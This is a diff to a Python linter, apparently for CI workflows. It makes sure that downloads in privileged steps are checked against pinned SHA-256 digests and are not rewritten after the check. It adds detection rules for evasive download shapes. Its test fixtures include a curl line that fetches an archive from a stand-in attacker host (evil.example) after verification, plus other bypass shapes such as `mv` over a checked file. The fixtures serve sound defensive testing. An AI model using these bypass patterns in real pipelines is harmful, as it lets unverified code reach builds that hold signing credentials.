@@ -1178,7 +1178,7 @@ _OPAQUE_SETTERS = re.compile(
 )
 
 #: `eval`, `source` or `.` in command position can set ANY name, so after one nothing resolves.
-_OPAQUE_ALL = re.compile(r"(?:^|[;&|(]\s*)(?:eval|source|\.)\s")
+_OPAQUE_ALL = re.compile(r"(?:^\s*|[;&|(]\s*)(?:eval|source|\.)\s")
 
 #: A digest followed by the file `sha256sum -c` checks it against (`<digest>  <file>`, with the
 #: optional `*` binary marker). Read AFTER variable expansion, so `${SBOMQS_SHA256}  ${asset}`
@@ -1271,13 +1271,20 @@ def _shell_words(line: str) -> list[tuple[str, bool]]:
 
 
 def _curl_args(args: list[str]) -> tuple[list[str], list[str]]:
-    """``(files one curl writes with -o or --output, [shapes whose output the walk cannot name])``."""
+    """``(files one curl writes with -o or --output, [shapes whose output the walk cannot name])``.
+
+    ``args`` arrive EXPANDED, so a URL spelled `${base}/${asset}` counts as one. Curl pairs each
+    `-o` with one URL, and a URL left over goes to stdout, so more URLs than `-o` values is an
+    unread shape too.
+    """
     outputs: list[str] = []
     shapes: list[str] = []
+    urls = 0
     i = 0
     while i < len(args):
         arg = args[i]
         if arg == "--":
+            urls += sum(1 for rest in args[i + 1 :] if "://" in rest or "$" in rest)
             break
         if arg.startswith("--"):
             name, eq, value = arg.partition("=")
@@ -1303,42 +1310,99 @@ def _curl_args(args: list[str]) -> tuple[list[str], list[str]]:
                     break
         elif arg.startswith((">", "1>")):
             shapes.append("stdout redirected with `>`")
+        elif "://" in arg or "$" in arg:
+            urls += 1
         i += 1
     files = [o for o in outputs if o not in ("", "-")]
     shapes.extend(f"-o {o or '<no value>'}" for o in outputs if o in ("", "-"))
     if not outputs and not shapes:
         shapes.append("no -o, so it writes to stdout")
+    elif urls > len(outputs) and not {"-O", "--remote-name-all"} & set(shapes):
+        shapes.append(f"{urls} URLs for {len(outputs)} -o, so the rest go to stdout")
     return files, shapes
 
 
-def _downloads(line: str) -> tuple[list[str], list[str]]:
-    """``(files the curls on ``line`` write, [downloads whose output the walk cannot name])``.
+#: Commands that write their LAST argument, so they can replace a file after it was checked.
+_FILE_WRITERS = frozenset({"mv", "cp", "ln", "install", "rsync", "tee", "dd"})
 
-    A download the walk cannot name is REPORTED, never skipped: that includes every `wget` and
-    `gh release download`, and a curl with `-O`, `--output-dir`, `-o -` or no `-o` at all.
-    """
-    words = _shell_words(line)
-    files: list[str] = []
-    unread: list[str] = []
-    for at, (word, is_op) in enumerate(words):
+#: Interpreters that run a program handed to them as a string, which the walk does not read.
+_STRING_RUNNERS = frozenset(
+    {"bash", "sh", "dash", "zsh", "python", "python3", "perl", "ruby", "node", "pwsh"}
+)
+
+#: Words that run the command after them, and `NAME=value` prefixes scoped to that command.
+_COMMAND_PREFIXES = frozenset({"sudo", "command", "env", "exec", "time", "nohup"})
+_PREFIX_ASSIGNMENT = re.compile(r"[A-Za-z_]\w*=.*")
+
+#: A redirection that writes a file: `>f`, `>> f`, `2>f`, `&>f`.
+_WRITE_REDIRECT = re.compile(r"^(?:\d*|&)>>?")
+
+
+def _commands(line: str) -> list[list[str]]:
+    """``line``'s simple commands, each as its words, split at every list and pipeline operator."""
+    commands: list[list[str]] = [[]]
+    for word, is_op in _shell_words(line):
         if is_op:
+            commands.append([])
+        else:
+            commands[-1].append(word)
+    return [c for c in commands if c]
+
+
+def _downloads(line: str, env: dict[str, str]) -> tuple[list[str], list[str], list[str]]:
+    """``(files curl writes, [other files written], [downloads the walk cannot name])``, expanded.
+
+    A download the walk cannot name is REPORTED, never skipped. That covers every `wget`, `aria2c`
+    and `gh ... release download`, a curl with `-O`, `--output-dir`, `-o -` or no `-o`, a command
+    named through a variable the walk cannot resolve, a backtick substitution, a program handed to
+    `bash -c` or `python -c`, and a line holding a URL no curl on it consumes.
+
+    "Other files written" are the targets of `mv`, `cp`, `ln`, `install`, `rsync`, `tee`, `dd` and
+    write redirections. Any of them can replace a checked file AFTER its check.
+    """
+    shown = line.strip()
+    files: list[str] = []
+    others: list[str] = []
+    unread: list[str] = []
+    if "`" in line:
+        unread.append(f"a backtick substitution ({shown!r})")
+    downloader = False
+    for words in _commands(line):
+        expanded = [_expand(w, env) for w in words]
+        for at, word in enumerate(expanded):
+            if _WRITE_REDIRECT.match(word):
+                target = _WRITE_REDIRECT.sub("", word) or (
+                    expanded[at + 1] if at + 1 < len(expanded) else ""
+                )
+                others.append(target)
+        k = 0
+        while k < len(words) and (
+            words[k] in _COMMAND_PREFIXES or _PREFIX_ASSIGNMENT.match(words[k])
+        ):
+            k += 1
+        if k >= len(words):
             continue
-        tool = word.rsplit("/", 1)[-1]
-        following = [w for w, _op in words[at + 1 : at + 3]]
-        if tool in ("wget", "aria2c") or (tool == "gh" and following == ["release", "download"]):
-            unread.append(f"`{tool}` ({line.strip()!r})")
-            continue
-        if tool != "curl":
-            continue
-        args: list[str] = []
-        for arg, arg_is_op in words[at + 1 :]:
-            if arg_is_op:
-                break
-            args.append(arg)
-        written, shapes = _curl_args(args)
-        files.extend(written)
-        unread.extend(f"curl {shape} ({line.strip()!r})" for shape in shapes)
-    return files, unread
+        tool = expanded[k].rsplit("/", 1)[-1]
+        rest = expanded[k + 1 :]
+        if "$" in tool:
+            unread.append(f"a command named through a variable, {words[k]!r} ({shown!r})")
+        elif tool in ("wget", "aria2c") or (tool == "gh" and {"release", "download"} <= set(rest)):
+            downloader = True
+            unread.append(f"`{tool}` ({shown!r})")
+        elif tool in _STRING_RUNNERS and any(a in ("-c", "-e", "-Command") for a in rest):
+            unread.append(f"a program handed to `{tool}` as a string ({shown!r})")
+        elif tool == "curl":
+            downloader = True
+            written, shapes = _curl_args(rest)
+            files.extend(written)
+            unread.extend(f"curl {shape} ({shown!r})" for shape in shapes)
+        elif tool in _FILE_WRITERS:
+            targets = [a for a in rest if not a.startswith("-")]
+            if targets:
+                others.append(targets[-1])
+    if "://" in line and not downloader and not _SIMPLE_ASSIGNMENT.match(line):
+        unread.append(f"a URL no curl on the line consumes ({shown!r})")
+    return files, others, unread
 
 
 def _opaque_names(lines: list[str]) -> set[str] | None:
@@ -1355,8 +1419,48 @@ def _opaque_names(lines: list[str]) -> set[str] | None:
     return names
 
 
-def _walk_step(body: str) -> tuple[set[str], list[str], list[tuple[str, str]]]:
-    """``(files curl wrote, [unread downloads], [(verify line, that line expanded)])``, IN ORDER.
+def _verify_feed(line: str) -> str | None:
+    """The text `echo`/`printf` pipes into `sha256sum -c -` on ``line``; ``None`` for any other shape.
+
+    The digest and the file must come from the command FEEDING the check, not from anywhere on the
+    line: `echo "<digest>  a.tgz" >/dev/null; sha256sum -c other.sums` holds a pinned digest and
+    checks a file of unpinned ones. So `sha256sum` must read stdin (no file operand but `-`) from a
+    pipe whose writer is `echo` or `printf`.
+    """
+    words = _shell_words(line)
+    for at, (word, is_op) in enumerate(words):
+        if is_op or word.rsplit("/", 1)[-1] != "sha256sum":
+            continue
+        operands = []
+        for arg, arg_is_op in words[at + 1 :]:
+            if arg_is_op:
+                break
+            operands.append(arg)
+        if "-c" not in operands or any(o != "-" and not o.startswith("-") for o in operands):
+            return None
+        if at < 2 or words[at - 1] != ("|", True):
+            return None
+        feeder: list[str] = []
+        for arg, arg_is_op in reversed(words[: at - 1]):
+            if arg_is_op:
+                break
+            feeder.insert(0, arg)
+        if not feeder or feeder[0] not in ("echo", "printf"):
+            return None
+        return " ".join(feeder[1:])
+    return None
+
+
+def _walk_step(
+    body: str,
+) -> tuple[
+    list[tuple[int, str]], list[tuple[int, str]], list[str], list[tuple[int, str, str | None]]
+]:
+    """``(curl writes, other writes, unread downloads, verifies)``, each tagged with its line index.
+
+    A write is ``(index, file)``. A verify is ``(index, raw line, expanded feed)``, where the feed
+    is what `_verify_feed` reads, or ``None`` when the line has another shape. The index is what
+    lets the rule see a file written AGAIN after its check.
 
     Each line is expanded against the assignments made BEFORE it, the way bash runs it, so a name
     reassigned between the download and the check resolves to what each line actually sees.
@@ -1369,15 +1473,18 @@ def _walk_step(body: str) -> tuple[set[str], list[str], list[tuple[str, str]]]:
     lines = logical_lines(body)
     opaque = _opaque_names(lines)
     env: dict[str, str] = {}
-    written: set[str] = set()
+    written: list[tuple[int, str]] = []
+    others: list[tuple[int, str]] = []
     unread: list[str] = []
-    verifies: list[tuple[str, str]] = []
-    for line in lines:
-        files, shapes = _downloads(line)
-        written.update(_expand(f, env) for f in files)
+    verifies: list[tuple[int, str, str | None]] = []
+    for index, line in enumerate(lines):
+        files, targets, shapes = _downloads(line, env)
+        written.extend((index, f) for f in files)
+        others.extend((index, t) for t in targets)
         unread.extend(shapes)
         if _CHECKSUM_VERIFY in line:
-            verifies.append((line.strip(), _expand(line, env)))
+            feed = _verify_feed(line)
+            verifies.append((index, line.strip(), None if feed is None else _expand(feed, env)))
         simple = _SIMPLE_ASSIGNMENT.match(line)
         if simple is None:
             continue
@@ -1386,7 +1493,7 @@ def _walk_step(body: str) -> tuple[set[str], list[str], list[tuple[str, str]]]:
             env.pop(name, None)
         else:
             env[name] = _expand(value, env)
-    return written, unread, verifies
+    return written, others, unread, verifies
 
 
 def _oidc_download_offences(body: str) -> list[str]:
@@ -1417,14 +1524,22 @@ def _oidc_download_offences(body: str) -> list[str]:
     as made.
     """
     offences: list[str] = []
-    written, unread, verifies = _walk_step(body)
+    written, others, unread, verifies = _walk_step(body)
     if not verifies:
         offences.append(
             f"carries no {_CHECKSUM_VERIFY!r}, so nothing compares the bytes against a literal, "
             f"inside `id-token: write`"
         )
         return offences
-    unbound = [raw for raw, expanded in verifies if not _SHA256_LITERAL.search(expanded)]
+    unshaped = [raw for _at, raw, feed in verifies if feed is None]
+    if unshaped:
+        offences.append(
+            f'runs {_CHECKSUM_VERIFY!r} in a shape other than `echo "<digest>  <file>" | '
+            f"sha256sum -c -`, so the digest it checks cannot be bound to the line's pin: {unshaped}"
+        )
+    unbound = [
+        raw for _at, raw, feed in verifies if feed is not None and not _SHA256_LITERAL.search(feed)
+    ]
     if unbound:
         offences.append(
             f"runs {_CHECKSUM_VERIFY!r} but the digest it checks traces to no in-repo SHA-256 "
@@ -1436,7 +1551,8 @@ def _oidc_download_offences(body: str) -> list[str]:
             f"wrote: {unread}. Spell each download `curl ... -o FILE`"
         )
     unresolved = sorted(
-        {f for f in written if "$" in f} | {raw for raw, expanded in verifies if "$" in expanded}
+        {f for _at, f in written if "$" in f}
+        | {raw for _at, raw, feed in verifies if feed is not None and "$" in feed}
     )
     if unresolved:
         offences.append(
@@ -1447,19 +1563,39 @@ def _oidc_download_offences(body: str) -> list[str]:
         f"lets a failed {_CHECKSUM_VERIFY!r} carry on to install the bytes: {reason}"
         for reason in verification_softeners(body)
     )
-    verified = {
-        m.group(1) for _raw, expanded in verifies for m in _DIGEST_AND_FILE.finditer(expanded)
-    }
+    # ORDER, not only membership: a file is covered only by a check AFTER its last write. Otherwise
+    # `curl -o a.tgz; <check a.tgz>; curl evil -o a.tgz` would pass, and so would an `mv` or `cp`
+    # onto the checked name after its check.
+    checks = [
+        (at, {m.group(1) for m in _DIGEST_AND_FILE.finditer(feed)})
+        for at, _raw, feed in verifies
+        if feed is not None
+    ]
+    verified = set().union(*(names for _at, names in checks))
+    writes = written + [(at, target) for at, target in others if target in verified]
+    last_write: dict[str, int] = {}
+    for at, name in writes:
+        last_write[name] = max(at, last_write.get(name, at))
     if not written:
         offences.append(
             "downloads with no `curl -o <file>`, so no verified filename can be tied to the "
             "bytes it fetched"
         )
-    elif unverified := written - verified:
+    elif unverified := {name for _at, name in written} - verified:
         offences.append(
             f"`curl -o` wrote {sorted(unverified)} and no in-repo digest checks it (the pin checks "
             f"{sorted(verified) or 'no resolvable filename'}); the step can install bytes nothing "
             f"verified"
+        )
+    rewritten = sorted(
+        name
+        for name, at in last_write.items()
+        if name in verified and not any(c > at and name in names for c, names in checks)
+    )
+    if rewritten:
+        offences.append(
+            f"writes {rewritten} after the last check of it, so the bytes the step goes on to use "
+            f"are not the bytes that were checked"
         )
     if _SAME_ORIGIN_CHECKSUM_FETCH.search(body):
         offences.append(
@@ -1772,7 +1908,73 @@ echo "${{PIN}}  ${{f:-a.tgz}}" | sha256sum -c -
                 ("ignore-missing", _GOOD_VERIFY.replace("-c -", "-c --ignore-missing -")),
                 ("set-plus-e", "set +e\n" + _GOOD_VERIFY),
                 ("set-plus-o-errexit", "set +o errexit\n" + _GOOD_VERIFY),
+                # Code review of this branch: control flow across lines, which the verify line
+                # itself does not show, and two ways to lose or rewrite the exit status.
+                ("function-with-fallback", f"verify() {{\n  {_GOOD_VERIFY}\n}}\nverify || echo w"),
+                ("multi-line-if", f"if\n  {_GOOD_VERIFY}\nthen echo ok; fi"),
+                ("brace-group-with-fallback", f"{{\n  {_GOOD_VERIFY}\n}} || echo w"),
+                ("exit-trap", f"trap 'exit 0' EXIT\n{_GOOD_VERIFY}"),
+                ("backgrounded-group", f"{{\n  {_GOOD_VERIFY}\n}} &\nwait"),
             )
+        ),
+        # Code review of this branch: a checked file written AGAIN after its check.
+        (
+            "re-downloaded-after-the-check",
+            _VERIFIED_A + 'curl -sSfL "https://evil.example/x.tgz" -o a.tgz\ntar -xzf a.tgz\n',
+            "after the last check",
+        ),
+        (
+            "moved-over-after-the-check",
+            _VERIFIED_A + "mv other.tgz a.tgz\ntar -xzf a.tgz\n",
+            "after the last check",
+        ),
+        # Code review of this branch: downloaders the walk did not recognise.
+        (
+            "command-named-through-a-variable",
+            _VERIFIED_A + 'C=curl\n$C -sSfL "https://github.com/o/r/releases/download/v1.0/b.tgz"'
+            " -o b.tgz\n",
+            "no in-repo digest checks it",
+        ),
+        (
+            "backtick-substitution",
+            _VERIFIED_A + 'x=`curl -sSfL "https://github.com/o/r/releases/download/v1.0/b.tgz"'
+            " -o b.tgz`\n",
+            "cannot read",
+        ),
+        (
+            "bash-dash-c",
+            _VERIFIED_A + "bash -c 'curl -sSfL https://github.com/o/r/releases/download/v1.0/b.tgz"
+            " -o b.tgz'\n",
+            "cannot read",
+        ),
+        (
+            "gh-with-a-flag-first",
+            _VERIFIED_A + "gh -R o/r release download v1.0 -p b.tgz\n",
+            "cannot read",
+        ),
+        (
+            "python-dash-c",
+            _VERIFIED_A + 'python3 -c "import urllib.request as u; u.urlretrieve('
+            "'https://github.com/o/r/releases/download/v1.0/b.tgz', 'b.tgz')\"\n",
+            "cannot read",
+        ),
+        (
+            "more-urls-than-outputs",
+            f"""PIN={_PINNED_DIGEST}
+curl -sSfL -o a.tgz "https://github.com/o/r/releases/download/v1.0/a.tgz" "https://github.com/o/r/releases/download/v1.0/b.tgz" | tar -xz
+echo "${{PIN}}  a.tgz" | sha256sum -c -
+""",
+            "cannot read",
+        ),
+        # Code review of this branch: the pinned digest sits on the verify LINE, but the check
+        # reads a different, unpinned sums file.
+        (
+            "digest-on-the-line-but-not-fed-to-the-check",
+            f"""PIN={_PINNED_DIGEST}
+curl -sSfL "https://github.com/o/r/releases/download/v1.0/a.tgz" -o a.tgz
+echo "${{PIN}}  a.tgz" >/dev/null; sha256sum -c ci/other.sums
+""",
+            "in a shape other than",
         ),
     ],
 )
